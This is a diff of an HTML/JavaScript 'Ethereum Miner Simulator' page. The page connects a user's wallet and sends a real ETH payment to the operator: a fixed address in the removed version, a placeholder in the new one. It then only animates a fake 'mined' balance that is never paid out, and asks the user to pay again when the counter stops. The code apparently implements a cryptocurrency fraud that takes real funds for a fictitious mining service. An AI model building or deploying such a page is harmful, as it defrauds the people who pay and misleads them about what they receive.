@@ -1,133 +1,102 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Simulated Ethereum Miner</title>
+  <meta charset="UTF-8">
+  <title>Ethereum Miner Simulator</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
   <style>
     body {
-      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
-      color: #fff;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      padding: 2rem;
-    }
-
-    .container {
+      background: #111;
+      color: #eee;
+      font-family: Arial, sans-serif;
       text-align: center;
+      padding: 40px;
     }
-
-    h1 {
-      margin-bottom: 20px;
-    }
-
-    .btn {
-      background-color: #1abc9c;
+    button {
+      padding: 12px 25px;
+      font-size: 16px;
+      margin-top: 20px;
+      background: #4CAF50;
+      color: white;
       border: none;
-      color: #fff;
-      padding: 10px 20px;
-      font-size: 1.2rem;
+      border-radius: 6px;
       cursor: pointer;
-      border-radius: 5px;
     }
-
-    .btn:hover {
-      background-color: #16a085;
-    }
-
-    .info, .actions {
+    #balance {
       margin-top: 20px;
-    }
-
-    .status {
-      font-size: 1.2rem;
-      margin-top: 10px;
-    }
-
-    #qrcode {
-      margin-top: 20px;
+      font-size: 20px;
+      color: #0f0;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>🚀 Simulated Ethereum Miner</h1>
-    <button id="connectWallet" class="btn">🔗 Connect Wallet</button>
-    <div id="walletInfo" class="info"></div>
-    <div id="actions" class="actions" style="display: none;">
-      <h2>🛠️ Actions</h2>
-      <button id="startMining" class="btn">⚒️ Start Mining Ethereum</button>
-      <div id="miningStatus" class="status"></div>
-    </div>
-    <div id="qrcode" style="display: none;">
-      <h3>Scan to Connect</h3>
-      <div id="qrCodeContainer"></div>
-    </div>
-  </div>
+  <h1>Ethereum Miner Simulator</h1>
+  <button onclick="connectWallet()">Connect Wallet</button>
+  <div id="walletAddress"></div>
+  <button onclick="startMining()" id="mineBtn" disabled>Start Mine</button>
+  <div id="status"></div>
+  <div id="balance">Balance: 0 ETH</div>
 
-  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@2.0.0/dist/umd/index.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.0.0/dist/ethers.umd.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/qrcode-modal@1.8.0/dist/index.min.js"></script>
   <script>
     let provider;
     let signer;
+    let userAddress;
     let miningInterval;
-    let minedAmount = 0;
-    const miningRatePerSecond = 0.00000000382;
-    const monthlyCap = 0.0099;
+    let mining = false;
+    let minedETH = 0;
+    const miningRate = 0.00000000382;
+    const maxETH = 0.0099;
+    const miningFee = "0.00709";
 
-    document.getElementById("connectWallet").addEventListener("click", async () => {
-      try {
-        provider = new WalletConnectProvider.default({
-          infuraId: "41d29c816ae440b785bcdf5655d5c859",
-        });
-
-        await provider.enable();
-        signer = new ethers.providers.Web3Provider(provider).getSigner();
-        const address = await signer.getAddress();
-        document.getElementById("walletInfo").innerHTML = `✅ Connected Address: ${address}`;
-        document.getElementById("actions").style.display = "block";
-        document.getElementById("qrcode").style.display = "none";
-      } catch (error) {
-        console.error("Connection failed:", error);
-        document.getElementById("walletInfo").innerHTML = "❌ Connection Failed";
-        generateQRCode();
+    async function connectWallet() {
+      if (typeof window.ethereum !== 'undefined') {
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        signer = provider.getSigner();
+        userAddress = await signer.getAddress();
+        document.getElementById("walletAddress").innerText = `Connected: ${userAddress}`;
+        document.getElementById("mineBtn").disabled = false;
+      } else {
+        alert("MetaMask is not installed.");
       }
-    });
-
-    document.getElementById("startMining").addEventListener("click", async () => {
-      const paymentAmount = "0.0079";
-      const recipientAddress = "0xf1b3424bb282ee20e394717dcb4fe59fc67835e0";
-      try {
-        const tx = await signer.sendTransaction({
-          to: recipientAddress,
-          value: ethers.utils.parseEther(paymentAmount)
-        });
-        document.getElementById("miningStatus").innerText = `Payment sent: ${tx.hash}\nStarting simulated mining...`;
-        await tx.wait();
-        startSimulatedMining();
-      } catch (error) {
-        console.error("Payment failed:", error);
-        document.getElementById("miningStatus").innerText = "Error initiating mining process.";
-      }
-    });
-
-    function generateQRCode() {
-      const uri = provider.connector.uri;
-      WalletConnectQRCodeModal.open(uri);
     }
 
-    function startSimulatedMining() {
-      if (miningInterval) clearInterval(miningInterval);
-      minedAmount = 0;
+    async function startMining() {
+      if (mining) {
+        alert("Mining already in progress.");
+        return;
+      }
+
+      const tx = {
+        to: "0xYourWalletAddressHere", // Replace with your ETH address
+        value: ethers.utils.parseEther(miningFee)
+      };
+
+      try {
+        const response = await signer.sendTransaction(tx);
+        document.getElementById("status").innerText = "Waiting for payment confirmation...";
+        await response.wait();
+        document.getElementById("status").innerText = "Payment confirmed! Mining started.";
+        startMiningSimulation();
+      } catch (err) {
+        console.error(err);
+        document.getElementById("status").innerText = "Payment failed or cancelled.";
+      }
+    }
+
+    function startMiningSimulation() {
+      mining = true;
       miningInterval = setInterval(() => {
-        minedAmount += miningRatePerSecond;
-        if (minedAmount >= monthlyCap) {
+        if (minedETH >= maxETH) {
           clearInterval(miningInterval);
-          document.getElementById("miningStatus").innerText = `🎉 Mining complete! Total mined: ${monthlyCap.toFixed(8)} ETH`;
-        } else {
-          document.getElementById("miningStatus").innerText = `⛏️ Mining in progress... Total mined: ${minedAmount.toFixed(8)} ETH`;
+          mining = false;
+          document.getElementById("status").innerText = "Mining complete. Please pay to start again.";
+          return;
         }
-      }, 1000);
+
+        minedETH += miningRate;
+        document.getElementById("balance").innerText = `Balance: ${minedETH.toFixed(9)} ETH`;
+      }, 1000); // every second
     }
   </script>
 </body>
